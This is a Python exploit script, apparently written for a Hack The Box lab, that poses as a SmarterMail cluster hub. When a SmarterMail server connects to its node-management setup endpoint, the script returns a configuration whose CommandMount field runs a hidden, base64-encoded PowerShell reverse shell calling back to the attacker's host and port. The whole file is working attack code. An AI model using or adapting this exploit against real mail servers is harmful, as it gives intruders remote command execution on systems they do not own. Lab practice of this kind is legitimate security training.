#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import base64


# ============================================================
# HTB ATTACKER SETTINGS
# ============================================================

LHOST = "10.10.14.50"
LPORT = 4455

# Fake SmarterMail hub port
HUB_PORT = 8081


# ============================================================
# POWERSHELL PAYLOAD
# ============================================================

PS = f'''
$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535 | % {{0}};

while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0) {{
    $data = (New-Object System.Text.ASCIIEncoding).GetString($buffer,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}

$client.Close();
'''

# PowerShell -EncodedCommand expects UTF-16LE
encoded = base64.b64encode(
    PS.encode("utf-16le")
).decode()

PAYLOAD = (
    "powershell.exe "
    "-NoProfile "
    "-NonInteractive "
    "-WindowStyle Hidden "
    f"-EncodedCommand {encoded}"
)


# ============================================================
# HTTP HANDLER
# ============================================================

class Handler(BaseHTTPRequestHandler):

    def _send_json(self, code, obj):

        data = json.dumps(obj).encode("utf-8")

        self.send_response(code)
        self.send_header(
            "Content-Type",
            "application/json"
        )
        self.send_header(
            "Content-Length",
            str(len(data))
        )
        self.end_headers()

        self.wfile.write(data)

    def do_POST(self):

        if self.path != "/web/api/node-management/setup-initial-connection":

            self._send_json(
                404,
                {
                    "error": "not found",
                    "path": self.path
                }
            )

            return

        length = int(
            self.headers.get(
                "Content-Length",
                "0"
            )
        )

        body = self.rfile.read(length).decode(
            "utf-8",
            errors="replace"
        )

        print()
        print("[+] Received SmarterMail connection")
        print("[+] Path:", self.path)
        print("[+] Body:", body)
        print("[+] Sending CommandMount payload")
        print(f"[+] Reverse shell -> {LHOST}:{LPORT}")

        response = {

            "ClusterID":
                "f0e12780-f462-4b51-a7db-149f1d56209c",

            "SharedSecret":
                "any-value",

            "TargetHubs":
                {
                    "a": "b"
                },

            "IsStandby":
                False,

            "SystemMount":
                {
                    "Enabled":
                        True,

                    "ReadOnly":
                        False,

                    "MountPath":
                        "C:\\Windows\\Temp\\htb_mount",

                    "CommandMount":
                        PAYLOAD,

                    "UseArgumentsInCommand":
                        False
                },

            "SystemAdminUsernames":
                [
                    "admin"
                ]
        }

        self._send_json(
            200,
            response
        )


# ============================================================
# START SERVER
# ============================================================

def main():

    print("=" * 60)
    print(" SmarterMail fake hub")
    print("=" * 60)

    print(f"[+] LHOST:      {LHOST}")
    print(f"[+] LPORT:      {LPORT}")
    print(f"[+] HUB:        {LHOST}:{HUB_PORT}")
    print()
    print("[+] Waiting for SmarterMail...")
    print("=" * 60)

    server = HTTPServer(
        ("0.0.0.0", HUB_PORT),
        Handler
    )

    server.serve_forever()


if __name__ == "__main__":
    main()
